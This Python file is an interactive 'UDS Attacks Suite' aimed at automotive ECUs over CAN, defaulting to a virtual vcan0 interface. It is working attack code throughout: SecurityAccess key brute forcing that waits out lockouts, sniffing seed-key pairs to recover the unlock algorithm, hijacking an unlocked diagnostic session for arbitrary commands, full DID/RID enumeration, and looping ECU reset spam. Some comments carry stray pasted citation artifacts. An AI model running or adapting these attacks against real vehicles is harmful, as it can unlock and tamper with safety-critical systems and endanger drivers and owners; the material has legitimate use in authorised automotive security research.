#!/usr/bin/env python3
"""
Unified UDS Attacks Suite
- 1: Security Access Brute Force (single seed)
- 2: Seed-Key Reverse Engineering (sniff + detect XOR/ADD/SUB/MUL)
- 3: MITM Session Hijack + Interactive Console
- 4: DID/RID Enumeration (full range, fast)
- 5: Reset ECU Spamming (slow simulation)

Logging:
  -> attacks.log
"""

import can
import isotp
import time
import math
import random
import threading
import logging

# ============================
# GLOBAL CONFIG
# ============================
CHANNEL = "vcan0"
INTERFACE = "socketcan"

ECU_REQ_ID = 0x7E0   # Tester -> ECU
ECU_RESP_ID = 0x7E8  # ECU -> Tester

# ============================
# RUNTIME EDITABLE ECU IDs
# ============================
CURRENT_TX_ID = ECU_REQ_ID
CURRENT_RX_ID = ECU_RESP_ID

# ============================
# LOGGING
# ============================
logging.basicConfig(
    filename="attacks.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

# small helper
def log_print(msg: str, level="info"):
    print(msg)
    if level == "info":
        logging.info(msg)
    elif level == "warn":
        logging.warning(msg)
    elif level == "error":
        logging.error(msg)
    else:
        logging.debug(msg)


# =====================================================================
# 1) SECURITY ACCESS BRUTE FORCE (Single Seed)  :contentReference[oaicite:1]{index=1}
# =====================================================================
def attack_bruteforce_single_seed():
    log_print("[ATTACK] SecurityAccess Brute Force (single seed) started")

    KEY_START = 0x11222000
    KEY_END   = 0x122222FF

    REQ_TIMEOUT = 0.1
    PROCESS_DELAY = 0.001

    NRC_MEANINGS = {
        0x10: "GeneralReject",
        0x11: "ServiceNotSupported",
        0x12: "SubFunctionNotSupported",
        0x13: "IncorrectMessageLengthOrInvalidFormat",
        0x22: "ConditionsNotCorrect",
        0x31: "RequestOutOfRange",
        0x33: "SecurityAccessDenied",
        0x35: "InvalidKey",
        0x36: "ExceedNumberOfAttempts",
        0x37: "RequiredTimeDelayNotExpired",
        0x78: "ResponsePending",
    }

    bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE)

    addr = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        rxid=ECU_RESP_ID,
        txid=ECU_REQ_ID
    )

    stack = isotp.CanStack(
        bus=bus,
        address=addr,
        params={"stmin": 0, "blocksize": 8, "wftmax": 0}
    )

    def uds_send_recv(payload: bytes, timeout: float = REQ_TIMEOUT):
        stack.send(payload)
        while stack.transmitting():
            stack.process()
            time.sleep(PROCESS_DELAY)

        start = time.time()
        while time.time() - start < timeout:
            stack.process()
            if stack.available():
                return stack.recv()
            time.sleep(PROCESS_DELAY)
        return None

    def decode_nrc(resp: bytes):
        if len(resp) >= 3 and resp[0] == 0x7F:
            sid = resp[1]
            nrc = resp[2]
            meaning = NRC_MEANINGS.get(nrc, "Unknown")
            return sid, nrc, meaning
        return None, None, None

    def request_seed():
        payload = bytes([0x27, 0x01])
        resp = uds_send_recv(payload)
        if resp is None:
            log_print("[SA] No response for 27 01")
            return None

        if resp[0] == 0x67 and resp[1] == 0x01:
            seed_bytes = resp[2:]
            log_print(f"[SA] SEED: {seed_bytes.hex()}")
            return seed_bytes

        sid, nrc, meaning = decode_nrc(resp)
        if sid:
            log_print(f"[SA] Negative response: NRC=0x{nrc:02X} ({meaning}) | {resp.hex()}")
        else:
            log_print(f"[SA] Unexpected response: {resp.hex()}")
        return None

    def try_key(key_value: int):
        key_bytes = key_value.to_bytes(4, "big")
        payload = bytes([0x27, 0x02]) + key_bytes
        resp = uds_send_recv(payload)

        if resp is None:
            return "NO_RESP", None

        if resp[0] == 0x67 and resp[1] == 0x02:
            return "POS", resp

        sid, nrc, meaning = decode_nrc(resp)
        if sid:
            return f"NRC_0x{nrc:02X}", resp

        return "UNKNOWN", resp

    def brute_force_single_seed():
        log_print("[ATTACKER] Starting single-seed brute force...")

        seed = request_seed()
        if seed is None:
            log_print("[ATTACKER] Could not get seed. Stopping.")
            return

        log_print("[ATTACKER] Brute forcing using this seed only.")
        log_print(f"[ATTACKER] Key range: 0x{KEY_START:08X} → 0x{KEY_END:08X}")

        current = KEY_START
        total_tried = 0

        while current <= KEY_END:
            status, resp = try_key(current)
            total_tried += 1

            if status == "POS":
                log_print("\n[+] SECURITY ACCESS GRANTED!")
                log_print(f"[+] CORRECT KEY: 0x{current:08X}")
                log_print(f"[+] ECU RESP: {resp.hex()}")
                return

            elif status.startswith("NRC_"):
                nrc = int(status.split("_0x")[1], 16)

                if nrc == 0x35:
                    if total_tried % 500 == 0:
                        log_print(f"[INFO] Tried {total_tried} keys so far... last=0x{current:08X}")
                    current += 1
                    continue

                elif nrc == 0x36:
                    log_print("[WARN] ECU locked us out (0x36). Waiting 1 second...")
                    time.sleep(1)
                    continue

                elif nrc == 0x37:
                    log_print("[WARN] Time delay not expired (0x37). Retrying...")
                    time.sleep(0.5)
                    continue

                else:
                    current += 1
                    continue

            elif status == "NO_RESP":
                log_print(f"[WARN] No response at key 0x{current:08X}")
                current += 1
                continue

            else:
                current += 1
                continue

        log_print("\n[ATTACKER] Finished brute forcing. No key found.")
        log_print(f"Total tries: {total_tried}")

    try:
        brute_force_single_seed()
    except KeyboardInterrupt:
        log_print("[ATTACK] Brute Force interrupted by user", "warn")


# =====================================================================
# 2) SEED-KEY REVERSE ENGINEERING (sniff + detect algo) :contentReference[oaicite:2]{index=2}
# =====================================================================
def attack_seed_key_reverse():
    log_print("[ATTACK] Seed-Key Reverse Engineering started")

    TESTER_ID = ECU_REQ_ID
    ECU_ID = ECU_RESP_ID
    TARGET_PAIRS = 3
    MOD32 = 2**32

    def parse_isotp_single(msg):
        data = msg.data
        if len(data) < 2:
            return None
        pci = data[0]
        if (pci & 0xF0) != 0x00:
            return None
        length = pci & 0x0F
        if length == 0 or (1 + length) > len(data):
            return None
        return data[1:1+length]

    def modinv(a, m):
        a = a % m
        if math.gcd(a, m) != 1:
            return None
        t, new_t = 0, 1
        r, new_r = m, a
        while new_r != 0:
            q = r // new_r
            t, new_t = new_t, t - q * new_t
            r, new_r = new_r, r - q * new_r
        if t < 0:
            t += m
        return t

    def detect_operation_from_two(seed1, key1, seed2, key2):
        log_print(f"\n[DETECT] Using first two pairs:")
        log_print(f"  Pair1: SEED=0x{seed1:08X} KEY=0x{key1:08X}")
        log_print(f"  Pair2: SEED=0x{seed2:08X} KEY=0x{key2:08X}")

        C_xor = (seed1 ^ key1) & 0xFFFFFFFF
        if ((seed2 ^ C_xor) & 0xFFFFFFFF) == key2:
            log_print("\n[DETECT] Candidate: XOR")
            log_print(f"         KEY = SEED ^ 0x{C_xor:08X}")
            return "XOR", C_xor

        C_add = (key1 - seed1) & 0xFFFFFFFF
        if ((seed2 + C_add) & 0xFFFFFFFF) == key2:
            log_print("\n[DETECT] Candidate: ADD")
            log_print(f"         KEY = (SEED + 0x{C_add:08X}) mod 2^32")
            return "ADD", C_add

        C_sub = (seed1 - key1) & 0xFFFFFFFF
        if ((seed2 - C_sub) & 0xFFFFFFFF) == key2:
            log_print("\n[DETECT] Candidate: SUB")
            log_print(f"         KEY = (SEED - 0x{C_sub:08X}) mod 2^32")
            return "SUB", C_sub

        inv = modinv(seed1, MOD32)
        if inv is not None:
            C_mul = (key1 * inv) % MOD32
            if ((seed2 * C_mul) % MOD32) == key2:
                log_print("\n[DETECT] Candidate: MUL")
                log_print(f"         KEY = (SEED * 0x{C_mul:08X}) mod 2^32")
                return "MUL", C_mul

        log_print("\n[DETECT] No matching operation from {XOR, ADD, SUB, MUL}")
        return None, None

    def validate_operation(op, C, pairs):
        log_print("\n[VALIDATE] Checking candidate operation on all pairs...")
        ok = True
        failures = []

        for i, (seed, key) in enumerate(pairs, 1):
            if op == "XOR":
                calc = (seed ^ C) & 0xFFFFFFFF
            elif op == "ADD":
                calc = (seed + C) & 0xFFFFFFFF
            elif op == "SUB":
                calc = (seed - C) & 0xFFFFFFFF
            elif op == "MUL":
                calc = (seed * C) % MOD32
            else:
                log_print("[VALIDATE] Unknown operation type.")
                return False, pairs

            if calc != key:
                ok = False
                failures.append((i, seed, key, calc))

        if ok:
            log_print("[VALIDATE] ✅ Operation fits ALL pairs, looks correct.")
        else:
            log_print("[VALIDATE] ❌ Operation failed on some pairs:")
            for idx, seed, key, calc in failures:
                log_print(f"   Pair {idx}: SEED=0x{seed:08X}, KEY=0x{key:08X}, calc=0x{calc:08X}")

        return ok, failures

    def sniff_and_collect_pairs():
        log_print(f"[SNIFF] Listening on {CHANNEL} ...")
        bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE)

        last_seed = None
        pending_key = None
        pairs = []

        while len(pairs) < TARGET_PAIRS:
            msg = bus.recv(timeout=1.0)
            if msg is None:
                continue

            payload = parse_isotp_single(msg)
            if payload is None or len(payload) < 2:
                continue

            sid = payload[0]

            if msg.arbitration_id == ECU_ID:
                if sid == 0x67 and len(payload) >= 2:
                    sub = payload[1]
                    if sub == 0x01 and len(payload) >= 2 + 4:
                        seed_bytes = payload[2:6]
                        seed_int = int.from_bytes(seed_bytes, "big")
                        last_seed = seed_int
                        log_print(f"[SNIFF] SEED from ECU: 0x{seed_int:08X}")
                    elif sub == 0x02:
                        if last_seed is not None and pending_key is not None:
                            log_print(f"[SNIFF] KEY accepted: 0x{pending_key:08X} for SEED 0x{last_seed:08X}")
                            pairs.append((last_seed, pending_key))
                            pending_key = None
                            log_print(f"[SNIFF] ==> Collected {len(pairs)}/{TARGET_PAIRS} pairs")

            elif msg.arbitration_id == TESTER_ID:
                if sid == 0x27 and len(payload) >= 2:
                    sub = payload[1]
                    if sub == 0x02 and len(payload) >= 2 + 4:
                        key_bytes = payload[2:6]
                        key_int = int.from_bytes(key_bytes, "big")
                        pending_key = key_int
                        log_print(f"[SNIFF] Tester sent KEY: 0x{key_int:08X}")

        log_print("\n[SNIFF] Finished collecting pairs:")
        for i, (seed, key) in enumerate(pairs, 1):
            log_print(f"  Pair {i}: SEED=0x{seed:08X}  KEY=0x{key:08X}")
        return pairs

    try:
        pairs = sniff_and_collect_pairs()
        if len(pairs) < 2:
            log_print("\n[MAIN] Not enough pairs (need at least 2).")
            return

        seed1, key1 = pairs[0]
        seed2, key2 = pairs[1]

        op, C = detect_operation_from_two(seed1, key1, seed2, key2)
        if op is None:
            log_print("\n[MAIN] Could not determine operation from first two pairs.")
            return

        ok, _ = validate_operation(op, C, pairs)

        if ok:
            log_print("\n[FINAL] ✅ Algorithm likely correct.")
        else:
            log_print("\n[FINAL] ⚠ Algorithm not consistent with all pairs.")

        log_print("\n[SUMMARY]")
        log_print(f"  Operation : {op}")
        if C is not None:
            log_print(f"  Constant  : 0x{C:08X}")
        else:
            log_print("  Constant  : N/A")

    except KeyboardInterrupt:
        log_print("[ATTACK] Seed-Key Reverse interrupted by user", "warn")


# =====================================================================
# 3) MITM SESSION HIJACK + INTERACTIVE CONSOLE :contentReference[oaicite:3]{index=3}
# =====================================================================
def attack_mitm_hijack():
    log_print("[ATTACK] MITM Session Hijack started")

    TESTER_ID = ECU_REQ_ID
    ECU_ID = ECU_RESP_ID

    TESTER_PRESENT_INTERVAL = 1.5
    PROCESS_DELAY = 0.001
    UDS_TIMEOUT = 1.0

    tp_running = False

    tx_bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE, receive_own_messages=True)

    addr = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        rxid=ECU_ID,
        txid=TESTER_ID
    )

    stack = isotp.CanStack(
        bus=tx_bus,
        address=addr,
        params={"stmin": 0, "blocksize": 8, "wftmax": 0}
    )

    sniff_bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE, receive_own_messages=True)

    def parse_sf(msg):
        data = msg.data
        if len(data) < 2:
            return None
        pci = data[0]
        if (pci & 0xF0) != 0x00:
            return None
        L = pci & 0x0F
        if L == 0 or L + 1 > len(data):
            return None
        return data[1:1+L]

    def clean_buffer():
        cleaned = 0
        while stack.available():
            _ = stack.recv()
            cleaned += 1
        if cleaned > 0:
            pass

    def uds_send(payload, timeout=UDS_TIMEOUT):
        stack.send(payload)
        while stack.transmitting():
            stack.process()
            time.sleep(PROCESS_DELAY)

        start = time.time()
        while time.time() - start < timeout:
            stack.process()
            if stack.available():
                resp = stack.recv()
                if resp and len(resp) >= 2 and resp[0] == 0x7E:
                    # swallow TesterPresent responses
                    continue
                return resp
            time.sleep(PROCESS_DELAY)
        return None

    def tester_present_thread():
        nonlocal tp_running
        log_print("[TP-THREAD] Started → REAL TesterPresent + swallow replies")

        while tp_running:
            frame = can.Message(
                arbitration_id=TESTER_ID,
                data=[0x02, 0x3E, 0x00],
                is_extended_id=False
            )
            tx_bus.send(frame)

            t0 = time.time()
            while time.time() - t0 < 0.3:
                msg = sniff_bus.recv(timeout=0.01)
                if msg and msg.arbitration_id == ECU_ID:
                    sf = parse_sf(msg)
                    if sf and sf[0] == 0x7E:
                        pass
                    break

            time.sleep(TESTER_PRESENT_INTERVAL)

    def console():
        log_print("\n🔥 You now control the Hijacked EXTENDED SESSION 🔥")
        print("Enter UDS commands (hex): 22 F1 A0  |  31 01 1234  | 2E F1 A0 55")
        print("Type 'exit' to quit.\n")

        while True:
            cmd = input("UDS> ").strip()
            if cmd.lower() in ["exit", "quit"]:
                break

            if not cmd:
                continue

            try:
                payload = bytes(int(x, 16) for x in cmd.split())
            except ValueError:
                print("Invalid hex format.")
                continue

            resp = uds_send(payload)
            if resp:
                print("ECU Response:", resp.hex())
            else:
                print("No response.")

    def hijack():
        nonlocal tp_running

        log_print("\n⚡ Session Hijack Triggered!")
        log_print("[HIJACK] Sending 10 03 (Extended Session)...")

        resp = uds_send(bytes([0x10, 0x03]))
        if resp:
            log_print(f"[HIJACK] 10 03 Response: {resp.hex()}")

        tp_running = True
        threading.Thread(target=tester_present_thread, daemon=True).start()

        log_print("[CLEAN] Flushing ISO-TP buffer before console...")
        clean_buffer()

        console()

        tp_running = False
        log_print("[TP-THREAD] Stopped.")

    try:
        log_print("[MITM] Waiting for SecurityAccess GRANTED (67 02)...")
        while True:
            msg = sniff_bus.recv(timeout=0.1)
            if msg and msg.arbitration_id == ECU_ID:
                sf = parse_sf(msg)
                if sf and sf[0] == 0x67 and len(sf) >= 2 and sf[1] == 0x02:
                    log_print("\n🔥 Captured 67 02 — ECU Unlocked!")
                    hijack()
                    break

            stack.process()
            time.sleep(0.001)

    except KeyboardInterrupt:
        log_print("[ATTACK] MITM hijack interrupted by user", "warn")


# =====================================================================
# 4) DID/RID ENUMERATION (full range) :contentReference[oaicite:4]{index=4}
# =====================================================================
def attack_enumeration():
    log_print("[ATTACK] DID/RID Enumeration started")

    ECU_RX_ID = ECU_REQ_ID
    ECU_TX_ID = ECU_RESP_ID

    DID_RANGES = [(0x0000, 0xFFFF)]
    RID_RANGES = [(0x0000, 0xFFFF)]

    FAST_TIMEOUT = 0.05
    PROCESS_DELAY = 0.0005

    bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE)

    addr = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        rxid=ECU_TX_ID,
        txid=ECU_RX_ID
    )

    stack = isotp.CanStack(
        bus=bus,
        address=addr,
        params={"stmin": 0, "blocksize": 8, "wftmax": 0}
    )

    def uds_fast(payload):
        stack.send(payload)
        while stack.transmitting():
            stack.process()

        t0 = time.time()
        while time.time() - t0 < FAST_TIMEOUT:
            stack.process()
            if stack.available():
                return stack.recv()
            time.sleep(PROCESS_DELAY)
        return None

    def fast_session(sub):
        resp = uds_fast(bytes([0x10, sub]))
        return bool(resp and resp[0] == 0x50)

    def fast_did_enum():
        log_print("\n[FAST] Scanning ALL DIDs (0x0000 → 0xFFFF)...")
        found = {}

        for lo, hi in DID_RANGES:
            for did in range(lo, hi + 1):
                hi_b = (did >> 8) & 0xFF
                lo_b = did & 0xFF

                resp = uds_fast(bytes([0x22, hi_b, lo_b]))
                if not resp:
                    continue

                if resp[0] == 0x62:
                    log_print(f"[DID FOUND] 0x{did:04X} | {resp.hex()}")
                    found[did] = "POS"
                    continue

                if resp[0] == 0x7F and len(resp) >= 3 and resp[2] == 0x33:
                    log_print(f"[DID PROTECTED] 0x{did:04X} → NRC 0x33")
                    found[did] = "SECURITY"
        return found

    def fast_rid_enum():
        log_print("\n[FAST] Scanning ALL RIDs (0x0000 → 0xFFFF)...")
        found = {}

        for lo, hi in RID_RANGES:
            for rid in range(lo, hi + 1):
                hi_b = (rid >> 8) & 0xFF
                lo_b = rid & 0xFF

                resp = uds_fast(bytes([0x31, 0x01, hi_b, lo_b]))
                if not resp:
                    continue

                if resp[0] == 0x71:
                    log_print(f"[RID FOUND] 0x{rid:04X} | {resp.hex()}")
                    found[rid] = "POS"
                    continue

                if resp[0] == 0x7F and len(resp) >= 3 and resp[2] == 0x33:
                    log_print(f"[RID PROTECTED] 0x{rid:04X} → NRC 0x33")
                    found[rid] = "SECURITY"
        return found

    try:
        log_print("[ATTACKER] Ultra-Fast FULL RANGE UDS Enumeration Started")
        fast_session(0x01)

        dids = fast_did_enum()
        rids = fast_rid_enum()

        log_print("\n========== SUMMARY ==========")
        log_print("\nDIDs:")
        for d, status in dids.items():
            log_print(f"  0x{d:04X} : {status}")

        log_print("\nRIDs:")
        for r, status in rids.items():
            log_print(f"  0x{r:04X} : {status}")

        log_print("\n[ATTACKER] Enumeration Done.")

    except KeyboardInterrupt:
        log_print("[ATTACK] Enumeration interrupted by user", "warn")


# =====================================================================
# 5) RESET ECU SPAMMING (slow simulation) :contentReference[oaicite:5]{index=5}
# =====================================================================
def attack_reset_spamming():
    log_print("[ATTACK] Reset ECU Spamming (slow simulation) started")

    ECU_RX_ID = ECU_REQ_ID
    ECU_TX_ID = ECU_RESP_ID

    BASE_DELAY = 3
    RANDOM_JITTER = 0.8
    REQ_TIMEOUT = 0.3

    RESET_SUB_FUNCTIONS = [0x01, 0x02, 0x03, 0x04, 0x05]

    NRC_MEANINGS = {
        0x10: "GeneralReject",
        0x11: "ServiceNotSupported",
        0x12: "SubFunctionNotSupported",
        0x13: "IncorrectMessageLengthOrInvalidFormat",
        0x22: "ConditionsNotCorrect",
        0x31: "RequestOutOfRange",
        0x33: "SecurityAccessDenied",
        0x35: "InvalidKey",
        0x36: "ExceedNumberOfAttempts",
        0x37: "RequiredTimeDelayNotExpired",
        0x78: "ResponsePending",
    }

    bus = can.interface.Bus(channel=CHANNEL, interface=INTERFACE)

    addr = isotp.Address(
        isotp.AddressingMode.Normal_11bits,
        rxid=ECU_TX_ID,
        txid=ECU_RX_ID
    )

    stack = isotp.CanStack(
        bus=bus,
        address=addr,
        params={"stmin": 0, "blocksize": 8, "wftmax": 0}
    )

    def uds_send_recv(payload: bytes):
        stack.send(payload)
        while stack.transmitting():
            stack.process()
            time.sleep(0.001)

        start = time.time()
        while time.time() - start < REQ_TIMEOUT:
            stack.process()
            if stack.available():
                return stack.recv()
            time.sleep(0.001)
        return None

    def decode_nrc(resp: bytes):
        if len(resp) >= 3 and resp[0] == 0x7F:
            sid = resp[1]
            nrc = resp[2]
            text = NRC_MEANINGS.get(nrc, "Unknown")
            return sid, nrc, text
        return None, None, None

    def send_reset(subfn):
        payload = bytes([0x11, subfn])
        resp = uds_send_recv(payload)

        print(f"\n[RESET] Sending ECU Reset → sub-function 0x{subfn:02X}")

        if resp is None:
            print("   → No response (ECU might be rebooting or ignoring)")
            return

        if resp[0] == 0x51:
            sf = resp[1] if len(resp) > 1 else 0x00
            print(f"   → POSITIVE RESPONSE (51 {sf:02X})")
            return

        sid, nrc, text = decode_nrc(resp)
        if sid is not None:
            print(f"   → NEGATIVE: NRC=0x{nrc:02X} ({text})   raw={resp.hex()}")
        else:
            print(f"   → UNKNOWN RESPONSE: {resp.hex()}")

    try:
        print("\n[ATTACKER] Slow Reset Simulation Started.")
        print("[ATTACKER] Press Ctrl+C to stop.\n")

        while True:
            for sub in RESET_SUB_FUNCTIONS:
                send_reset(sub)
                extra = random.uniform(0, RANDOM_JITTER)
                total_delay = BASE_DELAY + extra
                print(f"[WAIT] Sleeping {total_delay:.2f} seconds...\n")
                time.sleep(total_delay)

    except KeyboardInterrupt:
        log_print("[ATTACK] Reset Spamming interrupted by user", "warn")
        print("\n[ATTACKER] Stopped by user.")


# =====================================================================
# ECU IDs HELPERS
# =====================================================================
def initial_id_prompt():
    global CURRENT_TX_ID, CURRENT_RX_ID, ECU_REQ_ID, ECU_RESP_ID

    print("Enter ECU CAN IDs (press ENTER to use defaults).")
    tx = input(f"TX ID [default 0x{CURRENT_TX_ID:03X}]: ").strip()
    if tx != "":
        try:
            CURRENT_TX_ID = int(tx, 16)
            ECU_REQ_ID = CURRENT_TX_ID
        except:
            print("[ERROR] Invalid TX value, keeping default.")

    rx = input(f"RX ID [default 0x{CURRENT_RX_ID:03X}]: ").strip()
    if rx != "":
        try:
            CURRENT_RX_ID = int(rx, 16)
            ECU_RESP_ID = CURRENT_RX_ID
        except:
            print("[ERROR] Invalid RX value, keeping default.")

    print(f"[CONFIG] Using TX=0x{CURRENT_TX_ID:03X}, RX=0x{CURRENT_RX_ID:03X}\n")


def change_ecu_ids():
    global CURRENT_TX_ID, CURRENT_RX_ID, ECU_REQ_ID, ECU_RESP_ID

    print("\n========= CHANGE ECU CAN IDs =========")
    print(f"Current TX (Tester → ECU): 0x{CURRENT_TX_ID:03X}")
    print(f"Current RX (ECU → Tester): 0x{CURRENT_RX_ID:03X}")
    print("--------------------------------------")

    new_tx = input("Enter new TX ID (hex) or ENTER to keep: ").strip()
    if new_tx != "":
        try:
            CURRENT_TX_ID = int(new_tx, 16)
            ECU_REQ_ID = CURRENT_TX_ID
            print(f"[UPDATED] TX ID → 0x{CURRENT_TX_ID:03X}")
            logging.info(f"TX updated to 0x{CURRENT_TX_ID:03X}")
        except:
            print("[ERROR] Invalid TX value")

    new_rx = input("Enter new RX ID (hex) or ENTER to keep: ").strip()
    if new_rx != "":
        try:
            CURRENT_RX_ID = int(new_rx, 16)
            ECU_RESP_ID = CURRENT_RX_ID
            print(f"[UPDATED] RX ID → 0x{CURRENT_RX_ID:03X}")
            logging.info(f"RX updated to 0x{CURRENT_RX_ID:03X}")
        except:
            print("[ERROR] Invalid RX value")

    print("======================================\n")


# =====================================================================
# MAIN MENU
# =====================================================================
def main_menu():
    while True:
        print("\n====================== UDS ATTACKS SUITE ======================")
        print(f"Current ECU IDs: TX=0x{ECU_REQ_ID:03X}  RX=0x{ECU_RESP_ID:03X}")
        print("1) Security Access Brute Force (single-seed)")
        print("2) Seed-Key Reverse Engineering (sniff + algo detect)")
        print("3) MITM Session Hijack + Interactive Console")
        print("4) DID/RID Enumeration (full range)")
        print("5) Reset ECU Spamming (slow simulation)")
        print("6) Change ECU CAN IDs (TX/RX)")
        print("0) Exit")
        print("===============================================================")
        choice = input("Select attack (0-6): ").strip()

        if choice == "0":
            log_print("[MAIN] Exiting UDS Attacks Suite")
            break

        try:
            if choice == "1":
                attack_bruteforce_single_seed()
            elif choice == "2":
                attack_seed_key_reverse()
            elif choice == "3":
                attack_mitm_hijack()
            elif choice == "4":
                attack_enumeration()
            elif choice == "5":
                attack_reset_spamming()
            elif choice == "6":
                change_ecu_ids()
            else:
                print("Invalid choice.")
        except KeyboardInterrupt:
            log_print("[MAIN] Attack interrupted, back to main menu", "warn")
            print("\n[MAIN] Back to main menu...\n")


if __name__ == "__main__":
    initial_id_prompt()
    main_menu()
